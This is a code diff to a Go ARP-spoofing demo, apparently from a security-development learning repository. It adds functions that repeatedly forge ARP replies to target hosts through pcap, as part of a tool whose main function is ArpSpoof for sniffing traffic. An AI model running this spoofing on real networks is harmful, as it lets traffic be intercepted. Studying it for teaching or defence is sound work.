@@ -7,12 +7,15 @@ import (
 	"os"
 	"os/signal"
 	"time"
+
 	"github.com/malfunkt/arpfox/arp"
 	"github.com/malfunkt/iprange"
+
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
-	"SafeDp/sniffer/arp_sniff_demo/logger"
+
+	"sec-dev-in-action-src/sniffer/arp_sniff_demo/logger"
 )
 
 func ArpSpoof(DeviceName string, handler *pcap.Handle, target, gateway string) {
@@ -91,6 +94,57 @@ func ArpSpoof(DeviceName string, handler *pcap.Handle, target, gateway string) {
 	os.Exit(0)
 }
 
+func cleanUpAndReARP(handler *pcap.Handle, targetAddrs []net.IP, src *arp.Address) chan struct{} {
+	logger.Log.Infof("Cleaning up and re-ARPing targets...")
+
+	stopReARPing := make(chan struct{})
+	go func() {
+		t := time.NewTicker(time.Second * 5)
+		<-t.C
+		close(stopReARPing)
+	}()
+
+	return writeARP(handler, stopReARPing, targetAddrs, src, 500*time.Millisecond)
+}
+
+func writeARP(handler *pcap.Handle, stop chan struct{}, targetAddrs []net.IP, src *arp.Address, waitInterval time.Duration) chan struct{} {
+	stoppedWriting := make(chan struct{})
+	go func(stoppedWriting chan struct{}) {
+		t := time.NewTicker(waitInterval)
+		for {
+			select {
+			case <-stop:
+				stoppedWriting <- struct{}{}
+				return
+			default:
+
+				<-t.C
+				for _, ip := range targetAddrs {
+					arpAddr, err := arp.Lookup(binary.BigEndian.Uint32(ip))
+					if err != nil {
+						logger.Log.Errorf("Could not retrieve %v's MAC address: %v", ip, err)
+						continue
+					}
+					dst := &arp.Address{
+						IP:           ip,
+						HardwareAddr: arpAddr.HardwareAddr,
+					}
+					//buf, err := arp.NewARPRequest(src, dst)
+					buf, err := arp.NewARPReply(src, dst)
+					if err != nil {
+						logger.Log.Error("NewARPRequest: ", err)
+						continue
+					}
+					if err := handler.WritePacketData(buf); err != nil {
+						logger.Log.Error("WritePacketData: ", err)
+					}
+				}
+			}
+		}
+	}(stoppedWriting)
+	return stoppedWriting
+}
+
 func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
 	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
 	in := src.Packets()
@@ -117,5 +171,3 @@ func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
 		}
 	}
 }
-
-			
